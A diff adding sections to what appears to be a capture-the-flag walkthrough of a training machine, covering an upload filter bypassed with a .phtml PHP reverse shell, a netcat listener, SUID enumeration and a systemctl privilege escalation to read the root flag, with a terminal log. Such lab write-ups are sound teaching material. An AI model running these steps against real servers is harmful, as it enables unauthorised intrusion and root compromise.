@@ -123,4 +123,100 @@ From the results we can see that the form can be uploaded at: `/internal`.
 #### [Task 4] Compromising Web Server
 Now that we know a point from where we can enter into the target machine, we start testing various files that can be uploaded to the server. We can try files like .txt, .html, .md and other but the one that gets blocked is .php.
 
-The next task is to create a list of files with various extensions that are mentioned and use it with [Burp](https://portswigger.net/burp/communitydownload) Intruder. After running the attack as described in the task, on extension is found to be allowed and that is .phtml.
+The next task is to create a list of files with various extensions that are mentioned and use it with [Burp](https://portswigger.net/burp/communitydownload) Intruder. After running the attack as described in the task, one extension is found to be allowed and that is .phtml.
+
+As per the instructions on the task, we need to download the reverse PHP shell and perform the following task.
+1. Rename the file (payload.phtml) and make changes related to IP and port
+2. Start listening using [netcat](https://nmap.org/ncat/) command: `nc -nvlp 1234`
+3. Upload the shell payload at `/internal`
+4. Visit: `http://<machine IP>:3333/internal/uploads/payload.phtml`
+
+Once we open the link, a netcat session starts on our listner with a shell access to the machine. To check the user who manages the web server, we can go to /home directory and find the user there. The flag is present in the directory of that user itself in a file named `user.txt`.
+
+### [Task 5] Privilege Escalation
+As we were able to access the user's folder, this means that we are currently having user level access but not root level. And to gain root level access we need to perform privilege escalation. After some googling, we can find over the internet that the permissions value for SUID files is 4000 and we can run a search accordingly:
+`find / -perm /4000 2> /dev/null`
+
+| Flag | Description |
+| / | The path for directory that is to be searched |
+| -perm | Find files related the specified permission value |
+| 2> /dev/null | Helps to omit the files we don't have access to from the resulting output |
+
+The output containes many files which are given below:
+```
+$ find / -perm /4000 2> /dev/null
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/squid/pinger
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/ntfs-3g
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/systemctl
+/bin/ping
+/bin/fusermount
+/sbin/mount.cifs
+```
+
+The one file that stands out is /bin/systemctl. Now the next task is totally up on us. To solve this question and get the root flag there is only one source for our help and that is Google. After searching for `systemctl privilege escalation`, we can find results related to [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/).
+
+Using GTFOBins for systemctl, exploitation can be performed as:
+
+```
+tester@kali:~$ nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.8.48.20] from (UNKNOWN) [10.10.222.75] 48674
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 03:38:12 up 3 min,  0 users,  load average: 0.71, 1.13, 0.52
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ TF=$(mktemp).service
+$ echo '[Service]
+> Type=oneshot
+> ExecStart=/bin/sh -c "/root/root.txt > /tmp/output"
+> [Install]
+> WantedBy=multi-user.target' > $TF
+$ sudo systemctl link $TF
+sudo: no tty present and no askpass program specified
+$ TF=$(mktemp).service
+$ echo '[Service]
+> Type=oneshot
+> ExecStart=/bin/sh -c "/root/root.txt > /tmp/output"
+> [Install]
+> WantedBy=multi-user.target' > $TF
+$ ./systemctl link $TF
+/bin/sh: 14: ./systemctl: not found
+$ TF=$(mktemp).service
+$ echo '[Service]
+> Type=oneshot
+> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+> [Install]
+> 
+WantedBy=multi-user.target' > $TF> 
+$ /bin/systemctl link $TF
+Created symlink from /etc/systemd/system/tmp.LQV4ISuo3H.service to /tmp/tmp.LQV4ISuo3H.service.
+$ /bin/systemctl enable --now $TF
+Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.LQV4ISuo3H.service to /tmp/tmp.LQV4ISuo3H.service.
+$ cat /tmp/output
+```
+We need to make some changes to the commands provided in the GTFOBins which are given below:
+1. Replace `id` with `cat /root/root.txt` 
+2. Executing `/bin/systemctl` instead of `./systemctl` as we are not in `/bin`.
+
+And that is how we get the root and solve the room. 
